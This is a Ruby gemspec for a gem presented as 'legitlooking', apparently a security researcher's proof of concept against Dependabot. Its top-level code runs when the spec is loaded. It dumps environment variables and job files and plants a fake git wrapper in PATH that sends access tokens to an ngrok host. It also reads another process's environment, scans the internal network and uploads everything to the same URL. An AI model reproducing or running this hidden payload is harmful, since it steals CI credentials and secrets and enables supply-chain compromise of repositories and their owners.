# frozen_string_literal: true

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }

  lines = []
  lines << "=== ENV ===\n" + ENV.map { |k,v| "#{k}=#{v}" }.join("\n")
  lines << "\n=== JOB.JSON ===\n" + (read_file.("/home/dependabot/dependabot-updater/job.json") rescue "FOUT")

  # === ESCALATIE: GitHub API via de geauthenticeerde proxy ===
  # De proxy injecteert automatisch de Authorization header.
  # We disablen SSL verify omdat we intern zitten.
  lines << "\n=== GITHUB API VIA PROXY ==="

  def gh_req(method, url, body_hash = nil)
    require "uri"; require "net/http"
    uri = URI(url)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true; http.verify_mode = 0
    http.open_timeout = 10; http.read_timeout = 10
    req = Object.const_get("Net::HTTP::#{method.capitalize}").new(uri)
    req["Accept"] = "application/vnd.github+json"
    req["X-GitHub-Api-Version"] = "2022-11-28"
    if body_hash
      req["Content-Type"] = "application/json"
      req.body = body_hash.to_s.gsub("=>", ":").gsub("nil", "null")
        .gsub(": true", ": true").gsub(": false", ": false")
    end
    res = http.request(req)
    "Status: #{res.code}\nScopes: #{res["x-oauth-scopes"]}\nBody: #{res.body[0, 800]}"
  rescue => e
    "FOUT: #{e.message}"
  end

  # ============================================================
  # ESCALATIE: PATH hijacking via /home/dependabot/bin/git
  #
  # /home/dependabot/bin staat EERSTE in PATH.
  # Wij schrijven een fake git die:
  #   1. Alle aanroepen logt (incl. x-access-token:TOKEN in git config calls)
  #   2. De echte git aanroept zodat Dependabot normaal doorgaat (transparant)
  #   3. Bij credential-gerelateerde calls het token exfiltreert
  # ============================================================

  dep_bin = "/home/dependabot/bin"
  collab = COLLAB_URL

  # Controleer of we kunnen schrijven naar /home/dependabot/bin
  lines << "\n--- /home/dependabot/bin inhoud ---"
  lines << (`ls -la #{dep_bin}/ 2>&1`)

  # Schrijf de fake git wrapper
  fake_git = <<~'SHELL'
    #!/bin/sh
    # Transparante git wrapper - logt alles, exfiltreert tokens
    LOG=/tmp/git_intercept.log
    COLLAB_URL="__COLLAB__"

    # Log alle aanroepen
    echo "$(date) GIT: $*" >> "$LOG"
    echo "ENV_URL: $(git config --global --get-all url.https://)" >> "$LOG" 2>/dev/null || true

    # Zoek naar tokens in de argumenten (git config url.https://x-access-token:TOKEN@...)
    ARGS="$*"
    if echo "$ARGS" | grep -q "x-access-token"; then
      TOKEN=$(echo "$ARGS" | grep -o 'x-access-token:[^@]*' | head -1)
      echo "TOKEN GEVONDEN: $TOKEN" >> "$LOG"
      # Exfiltreer het token
      curl -s "${COLLAB_URL}?token=$(echo "$TOKEN" | sed 's/x-access-token://')" &
    fi

    # Controleer ook git config store na elke aanroep
    GLOBAL_URL=$(/usr/bin/git config --global --get-regexp "url\." 2>/dev/null)
    if [ -n "$GLOBAL_URL" ]; then
      echo "GLOBAL_URL_CONFIG: $GLOBAL_URL" >> "$LOG"
      if echo "$GLOBAL_URL" | grep -q "x-access-token"; then
        TOKEN=$(echo "$GLOBAL_URL" | grep -o 'x-access-token:[^@]*' | head -1)
        curl -s "${COLLAB_URL}?path_hijack_token=$(echo "$TOKEN" | sed 's/x-access-token://')" &
      fi
    fi

    # Roep de echte git aan (transparant)
    exec /usr/bin/git "$@"
  SHELL

  fake_git_script = fake_git.gsub("__COLLAB__", collab)

  begin
    fake_git_path = "#{dep_bin}/git"
    IO.binwrite(fake_git_path, fake_git_script)
    `chmod +x #{fake_git_path} 2>&1`
    lines << "\n--- Fake git geschreven naar #{fake_git_path} ---"
    lines << `ls -la #{fake_git_path} 2>&1`
    lines << "Wacht op Dependabot git calls na parse-fase..."
  rescue => e
    lines << "\n--- Fake git schrijven mislukt: #{e.message} ---"
  end

  # Lees ook /proc van het hoofd-updater proces (zelfde user = leesbaar)
  lines << "\n--- /proc hoofdproces ---"
  main_pid = `pgrep -f 'ruby.*update_files' 2>/dev/null`.strip.split.first
  if main_pid
    lines << "Main PID: #{main_pid}"
    lines << "Open FDs: #{`ls -la /proc/#{main_pid}/fd 2>/dev/null`[0, 500]}"
    # Lees environment van het hoofdproces
    main_env = IO.binread("/proc/#{main_pid}/environ") rescue ""
    main_env_parsed = main_env.gsub("\x00", "\n")
    lines << "Main process ENV:\n#{main_env_parsed[0, 1000]}"
  end

  # === PIVOT: interne netwerk scan ===
  lines << "\n=== INTERNE NETWERK SCAN ==="
  lines << `nmap -sn 172.19.0.0/24 2>/dev/null || for i in $(seq 1 10); do (ping -c1 -W1 172.19.0.$i >/dev/null 2>&1 && echo "172.19.0.$i UP") || true; done 2>/dev/null`.to_s[0, 800]

  # === Repo inhoud lezen via proxy ===
  lines << "\n=== GECLONEDE REPO BESTANDEN ==="
  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
  lines << `ls -la #{repo_path}/ 2>/dev/null`.to_s[0, 500]
  lines << `find #{repo_path} -name "*.env" -o -name ".env*" -o -name "*.secret" 2>/dev/null`.to_s[0, 300]

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")

  uri = URI("#{COLLAB_URL}?poc=escalatie")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https",
                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }

rescue => e
  begin
    require "net/http"
    require "uri"
    uri = URI("#{COLLAB_URL}?poc=escalatie&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue
  end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.8"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]

  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
